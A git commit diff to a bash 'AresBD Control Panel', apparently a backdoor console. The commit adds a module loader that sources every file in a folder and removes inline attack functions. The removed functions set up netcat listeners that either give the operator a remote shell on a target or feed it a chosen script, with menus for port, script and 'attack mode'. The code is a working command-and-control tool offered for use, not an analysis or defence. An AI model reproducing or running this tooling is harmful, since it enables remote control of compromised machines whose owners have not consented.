cbe4f9dd356cffbde79a20eb1ba404b181507afa
Stsosz <sabergelpreston@icloud.com>
2015-01-29 13:01:52 -0500

    Add Module loading system

--- ABDConsole/Ares/aresbd.bash
+++ ABDConsole/Ares/aresbd.bash
@@ -2,8 +2,17 @@
 # AresBD Control Panel by Stsosz
 
 # Define Variables
-PS3='ABDConsole: '
-options=("Set Port" "Set Script" "Set Attack Mode" "Show Options" "Start Attack" "Help" "Quit")
+source ~/Ares/aresbd.conf
+PS3=$MENUPROMPT
+
+# Load Modules
+cd ~/Ares/Modules
+for file in * ; do
+  if [ -f "$file" ] ; then
+    source "$file"
+  fi
+done
+cd ~/Ares
 
 echo ===========================================================
 echo "                         ____  _____                     ";
@@ -21,142 +30,6 @@ echo "         __/ |                                           ";
 echo "        |___/                                            ";
 echo ===========================================================
 
-function showHelp()
-{
-	echo "Usage: aresbd"
-	echo ""
-	
-	echo "Set Port: "
-	echo "Set the port to listen on"
-	echo ""
-	
-	echo "Set Script: "
-	echo "Choose a script to send to the target in Script mode"
-	echo ""
-	
-	echo "Set Attack Mode: "
-	echo "Chose from 2 modes: Script and Shell"
-	echo "In script mode, the selected script is"
-	echo "fed line-by-line to the target."
-	echo "In Shell mode, a remote shell, almost"
-	echo "like SSH, is connected to the target."	
-	echo ""
-	
-	echo "Show Options: "
-	echo "List all user selected options."
-	echo ""
-	
-	echo "Start Attack: "
-	echo "Initiate either a Shell or Script attack."
-	
-	echo "Help: "
-	echo "Show this message!"
-	echo ""
-
-	echo "Quit: "
-	echo "I don't even..."
-}
-
-# Set the port to listen on
-function setPort()
-{
-	read -rp "Receiving port: " PORT
-}
-
-# Set the attack mode
-function setAttack()
-{
-	PS3='Attack Mode: '
-	options=("Shell" "Script")
-	select opt in "${options[@]}"
-	do
-	    case $opt in
-	        "Shell")
-	            ATTACKMODE=Shell
-				PS3='ABDConsole: '
-				break
-	            ;;
-	        "Script")
-	            ATTACKMODE=Script
-				PS3='ABDConsole: '
-				break
-	            ;;
-	        *) echo invalid option;;
-	    esac
-	done
-}
-
-# Choose a file to use with attackScript
-function setScript()
-{
-	cd ~/Ares/Scripts
-	PS3='Script: '
-	select SCRIPT in *; do
-		PS3='ABDConsole: '
-		cd ~/Ares
-	break
-done
-}
-
-# Listen for incoming TCP connections.
-function attackShell()
-{
-	if [[ -z "$PORT" ]]; then
-		echo "You need to set the port first!"
-	else
-		nc -l -p $PORT
-	fi
-}
-
-# Listen for incoming TCP connections, and feed them the specified script.
-function attackScript()
-{
-	if [[ -z "$PORT" ]]; then
-		echo "You need to set the port first!"
-	elif [[ -z "$SCRIPT" ]]; then
-		echo "You need to set the script first!"
-	else
-		nc -l -p $PORT < ~/Ares/Scripts/$SCRIPT
-	fi
-}
-
-# Show the user what settings they have chosen
-function showOpts()
-{
-	if [[ -z "$PORT" ]]; then
-		echo "No port chosen. "
-	else
-		echo Port: $PORT
-	fi
-	
-	if [[ -z "$SCRIPT" ]]; then
-		echo "No script chosen. "
-	else
-		echo Script: $SCRIPT
-	fi
-	
-	if [[ -z "$ATTACKMODE" ]]; then
-		echo "No attack mode chosen. "
-	else
-		echo Attack Mode: $ATTACKMODE
-	fi
-}
-
-# Decide what attack function to use. 
-function attackLogic()
-{
-	if [[ -z "$ATTACKMODE" ]]; then
-	echo "You need to set an attack mode first!"
-	fi
-	
-	if [[ $ATTACKMODE = "Shell" ]]; then
-		attackShell
-	fi
-	
-	if [[ $ATTACKMODE = "Script" ]]; then
-		attackScript
-	fi
-}
 
 # User Menu
 select opt in "${options[@]}"
